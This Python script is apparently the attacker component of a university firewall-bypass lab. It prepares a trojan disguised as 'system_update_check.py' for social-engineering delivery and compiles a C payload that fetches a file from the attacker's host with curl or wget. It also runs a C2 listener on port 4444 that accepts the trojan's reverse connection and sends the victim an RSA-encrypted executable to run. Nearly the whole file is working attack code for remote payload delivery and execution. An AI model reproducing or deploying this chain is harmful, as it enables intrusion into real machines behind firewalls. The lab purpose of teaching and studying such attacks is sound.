#!/usr/bin/env python3
"""
attacker.py - CSC431 Firewall Bypass Lab

Workflow:
  1. Prepares a disguised trojan with attacker IP baked in
  2. Compiles a payload that downloads a txt file
  3. Hosts secret.txt on an HTTP server
  4. Listens on the BLOCKED port for the trojan's reverse connection
  5. Encrypts payload with victim's public key and sends it
  6. Payload runs on victim, downloads secret.txt

Usage: python3 attacker.py <attacker_ip>
"""

import socket
import os
import sys
import json
import subprocess
from cryptography.hazmat.primitives import serialization
from cryptography.hazmat.primitives.asymmetric import padding

MAX_PLAINTEXT = 245
ENCRYPTED_BLOCK = 256
C2_PORT = 4444
HTTP_PORT = 8000

PAYLOAD_SRC = """
#include <stdio.h>
#include <stdlib.h>
int main() {{
    printf("\\n========================================\\n");
    printf("  PAYLOAD RUNNING BEHIND FIREWALL\\n");
    printf("========================================\\n\\n");
    printf("Downloading secret.txt from %s:%d ...\\n\\n", "{attacker_ip}", {http_port});
    int r = system("curl -s -o downloaded.txt http://{attacker_ip}:{http_port}/secret.txt 2>/dev/null");
    if (r != 0)
        r = system("wget -q -O downloaded.txt http://{attacker_ip}:{http_port}/secret.txt 2>/dev/null");
    if (r == 0) {{
        printf("Download successful.\\n\\n");
        printf("--- downloaded.txt contents ---\\n");
        FILE *f = fopen("downloaded.txt", "r");
        if (f) {{
            char buf[512];
            while (fgets(buf, sizeof(buf), f))
                printf("  %s", buf);
            fclose(f);
        }}
        printf("\\n--- end ---\\n");
    }} else {{
        printf("Download failed.\\n");
    }}
    return 0;
}}
"""

SECRET = """CSC431 - Information Security & Computer Forensics
===================================================

Attack chain that delivered this file:

  1. Attacker crafted trojan disguised as 'system_update_check.py'
  2. Delivered to victim via social engineering
  3. Victim's firewall BLOCKED port {c2} inbound
  4. Trojan connected OUTBOUND on port {c2} (firewall allows outbound)
  5. Attacker RSA-encrypted an executable and sent it through
  6. Trojan decrypted and executed the payload
  7. Payload downloaded THIS FILE via HTTP (also outbound)

The firewall was bypassed because it only filtered INBOUND traffic.
The trojan and payload both used OUTBOUND connections.
"""

def recv_exact(conn, n):
    data = b""
    while len(data) < n:
        pkt = conn.recv(n - len(data))
        if not pkt:
            return None
        data += pkt
    return data

def main():
    if len(sys.argv) != 2:
        print(f"Usage: python3 {sys.argv[0]} <attacker_ip>")
        print(f"Example: python3 {sys.argv[0]} 192.168.1.100")
        sys.exit(1)

    attacker_ip = sys.argv[1]

    print("=" * 50)
    print("  CSC431 Firewall Bypass Lab - Attacker")
    print("=" * 50)
    print(f"\n  Attacker:  {attacker_ip}")
    print(f"  C2 Port:   {C2_PORT} (victim's firewall blocks this inbound)")
    print(f"  HTTP Port: {HTTP_PORT}")
    print()

    # step 1: prepare trojan
    print("[1/5] Preparing trojan for delivery...")
    os.makedirs("delivery", exist_ok=True)
    with open("trojan/system_update_check.py", "r") as f:
        src = f.read()
    src = src.replace("ATTACKER_IP_HERE", attacker_ip)
    with open("delivery/system_update_check.py", "w") as f:
        f.write(src)
    os.chmod("delivery/system_update_check.py", 0o755)
    print("  Ready: delivery/system_update_check.py")
    print("  Transfer this file to the victim machine.\n")

    # step 2: compile payload
    print("[2/5] Compiling payload...")
    with open("payload.c", "w") as f:
        f.write(PAYLOAD_SRC.format(attacker_ip=attacker_ip, http_port=HTTP_PORT))
    os.system("gcc -o payload payload.c")
    filesize = os.path.getsize("payload")
    total_chunks = (filesize + MAX_PLAINTEXT - 1) // MAX_PLAINTEXT
    print(f"  {filesize} bytes -> {total_chunks} RSA-encrypted chunks\n")

    # step 3: create secret.txt
    print("[3/5] Creating secret.txt...")
    with open("secret.txt", "w") as f:
        f.write(SECRET.format(c2=C2_PORT))
    print()

    # step 4: start HTTP server
    print(f"[4/5] Starting HTTP server on :{HTTP_PORT}...")
    http = subprocess.Popen(
        [sys.executable, "-m", "http.server", str(HTTP_PORT), "--bind", "0.0.0.0"],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL
    )
    print()

    # step 5: listen for reverse connection
    print(f"[5/5] Listening on :{C2_PORT} for reverse connection...")
    print("  Waiting for victim to run the trojan...\n")

    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(("0.0.0.0", C2_PORT))
    server.listen(1)

    conn, addr = server.accept()
    print(f"  >> Victim connected: {addr[0]}:{addr[1]}")

    key_len = int.from_bytes(recv_exact(conn, 4), "big")
    pubkey_der = recv_exact(conn, key_len)
    victim_key = serialization.load_der_public_key(pubkey_der)
    print(f"  >> Received RSA public key ({key_len} bytes)")

    metadata = json.dumps({
        "filename": "payload",
        "filesize": filesize,
        "chunks": total_chunks
    }).encode().ljust(1024)
    conn.sendall(metadata)

    print(f"  >> Sending encrypted payload...")
    with open("payload", "rb") as f:
        for i in range(total_chunks):
            chunk = f.read(MAX_PLAINTEXT)
            encrypted = victim_key.encrypt(chunk, padding.PKCS1v15())
            conn.sendall(encrypted)
            pct = ((i + 1) / total_chunks) * 100
            print(f"\r     {i+1}/{total_chunks} ({pct:.0f}%)", end="", flush=True)

    conn.close()
    server.close()

    print(f"\n\n  >> Payload delivered. Executing on victim.")
    print(f"  >> HTTP server running for secret.txt download.")
    print(f"\n  Press Ctrl+C to stop.\n")

    try:
        http.wait()
    except KeyboardInterrupt:
        http.terminate()
        print("Done.")

if __name__ == "__main__":
    main()